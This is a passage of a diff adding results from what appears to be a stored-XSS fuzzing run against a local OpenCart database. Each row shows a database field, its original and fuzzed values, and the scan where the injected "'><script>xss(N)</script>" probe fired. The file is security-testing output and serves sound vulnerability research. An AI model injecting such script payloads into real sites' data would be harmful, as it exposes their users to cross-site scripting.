DDC standard for plug-and-play setup&lt;/li&gt;\r\n&lt;/ul&gt;\r\n"", '', 'Apple Cinema 30', '', '']
+            change: 'Apple Cinema 30&quot;' => '""'><script>xss(967890)</script>'
+            
+fuzzed after scan 214 / 625
+found as XSS in scan 215 / 625"
+opencart,oc_banner_image.link,http://localhost/,970617,"""'><script>xss(970617)</script>","
+            opencart.oc_banner_image.link[12][4]
+            original row: [97, 8, 1, 'Starbucks', '', 'catalog/demo/manufacturer/starbucks.png', 0]
+            fuzzed row: [97, 8, 1, 'Starbucks', '""\'><script>xss(970617)</script>', 'catalog/demo/manufacturer/starbucks.png', 0]
+            change: '' => '""'><script>xss(970617)</script>'
+            
+fuzzed after scan 18 / 625
+found as XSS in scan 19 / 625"
+opencart,oc_category_description.name,http://localhost/,971777,"""'><script>xss(971777)</script>","
+            opencart.oc_category_description.name[22][2]
+            original row: [43, 1, 'test 11', '', 'test 11', '', '']
+            fuzzed row: [43, 1, '""\'><script>xss(971777)</script>', '', 'test 11', '', '']
+            change: 'test 11' => '""'><script>xss(971777)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_information_description.title,http://localhost/,974465,"""'><script>xss(974465)</script>","
+            opencart.oc_information_description.title[3][2]
+            original row: [4, 1, 'Delivery Information', '&lt;p&gt;\r\n\tDelivery Information&lt;/p&gt;\r\n', 'Delivery Information', '', '']
+            fuzzed row: [4, 1, '""\'><script>xss(974465)</script>', '&lt;p&gt;\r\n\tDelivery Information&lt;/p&gt;\r\n', 'Delivery Information', '', '']
+            change: 'Delivery Information' => '""'><script>xss(974465)</script>'
+            
+fuzzed after scan 118 / 625
+found as XSS in scan 119 / 625"
+opencart,oc_banner_image.link,http://localhost/,979716,"""'><script>xss(979716)</script>","
+            opencart.oc_banner_image.link[6][4]
+            original row: [91, 8, 1, 'Coca Cola', '', 'catalog/demo/manufacturer/cocacola.png', 0]
+            fuzzed row: [91, 8, 1, 'Coca Cola', '""\'><script>xss(979716)</script>', 'catalog/demo/manufacturer/cocacola.png', 0]
+            change: '' => '""'><script>xss(979716)</script>'
+            
+fuzzed after scan 18 / 625
+found as XSS in scan 19 / 625"
+opencart,oc_banner_image.title,http://localhost/,980225,"""'><script>xss(980225)</script>","
+            opencart.oc_banner_image.title[5][3]
+            original row: [90, 8, 1, 'Disney', '', 'catalog/demo/manufacturer/disney.png', 0]
+            fuzzed row: [90, 8, 1, '""\'><script>xss(980225)</script>', '', 'catalog/demo/manufacturer/disney.png', 0]
+            change: 'Disney' => '""'><script>xss(980225)</script>'
+            
+fuzzed after scan 17 / 625
+found as XSS in scan 18 / 625"
+opencart,oc_category_description.name,http://localhost/,981805,"""'><script>xss(981805)</script>","
+            opencart.oc_category_description.name[27][2]
+            original row: [48, 1, 'test 16', '', 'test 16', '', '']
+            fuzzed row: [48, 1, '""\'><script>xss(981805)</script>', '', 'test 16', '', '']
+            change: 'test 16' => '""'><script>xss(981805)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_category_description.name,http://localhost/,984759,"""'><script>xss(984759)</script>","
+            opencart.oc_category_description.name[12][2]
+            original row: [33, 1, 'Cameras', '', 'Cameras', '', '']
+            fuzzed row: [33, 1, '""\'><script>xss(984759)</script>', '', 'Cameras', '', '']
+            change: 'Cameras' => '""'><script>xss(984759)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_banner_image.title,http://localhost/,985543,"""'><script>xss(985543)</script>","
+            opencart.oc_banner_image.title[8][3]
+            original row: [93, 8, 1, 'Canon', '', 'catalog/demo/manufacturer/canon.png', 0]
+            fuzzed row: [93, 8, 1, '""\'><script>xss(985543)</script>', '', 'catalog/demo/manufacturer/canon.png', 0]
+            change: 'Canon' => '""'><script>xss(985543)</script>'
+            
+fuzzed after scan 17 / 625
+found as XSS in scan 18 / 625"
+opencart,oc_category_description.name,http://localhost/,985595,"""'><script>xss(985595)</script>","
+            opencart.oc_category_description.name[25][2]
+            original row: [46, 1, 'Macs', '', 'Macs', '', '']
+            fuzzed row: [46, 1, '""\'><script>xss(985595)</script>', '', 'Macs', '', '']
+            change: 'Macs' => '""'><script>xss(985595)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_banner_image.link,http://localhost/,986069,"""'><script>xss(986069)</script>","
+            opencart.oc_banner_image.link[9][4]
+            original row: [94, 8, 1, 'NFL', '', 'catalog/demo/manufacturer/nfl.png', 0]
+            fuzzed row: [94, 8, 1, 'NFL', '""\'><script>xss(986069)</script>', 'catalog/demo/manufacturer/nfl.png', 0]
+            change: '' => '""'><script>xss(986069)</script>'
+            
+fuzzed after scan 18 / 625
+found as XSS in scan 19 / 625"
+opencart,oc_category_description.name,http://localhost/,987100,"""'><script>xss(987100)</script>","
+            opencart.oc_category_description.name[6][2]
+            original row: [27, 1, 'Mac', '', 'Mac', '', '']
+            fuzzed row: [27, 1, '""\'><script>xss(987100)</script>', '', 'Mac', '', '']
+            change: 'Mac' => '""'><script>xss(987100)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_setting.value,http://localhost/,987939,"""'><script>xss(987939)</script>","
+            opencart.oc_setting.value[7][4]
+            original row: [8, 0, 'config', 'config_meta_keyword', '', 0]
+            fuzzed row: [8, 0, 'config', 'config_meta_keyword', '""\'><script>xss(987939)</script>', 0]
+            change: '' => '""'><script>xss(987939)</script>'
+            
+fuzzed after scan 367 / 625
+found as XSS in scan 368 / 625"
+opencart,oc_banner_image.link,http://localhost/,989598,"""'><script>xss(989598)</script>","
+            opencart.oc_banner_image.link[1][4]
+            original row: [80, 7, 1, 'MacBookAir', '', 'catalog/demo/banners/MacBookAir.jpg', 0]
+            fuzzed row: [80, 7, 1, 'MacBookAir', '""\'><script>xss(989598)</script>', 'catalog/demo/banners/MacBookAir.jpg', 0]
+            change: '' => '""'><script>xss(989598)</script>'
+            
+fuzzed after scan 18 / 625
+found as XSS in scan 19 / 625"
+opencart,oc_setting.value,http://localhost/,995287,"""'><script>xss(995287)</script>","
+            opencart.oc_setting.value[96][4]
+            original row: [99, 0, 'config', 'config_name', 'Your Store', 0]
+            fuzzed row: [99, 0, 'config', 'config_name', '""\'><script>xss(995287)</script>', 0]
+            change: 'Your Store' => '""'><script>xss(995287)</script>'
+            
+fuzzed after scan 368 / 625
+found as XSS in scan 369 / 625"
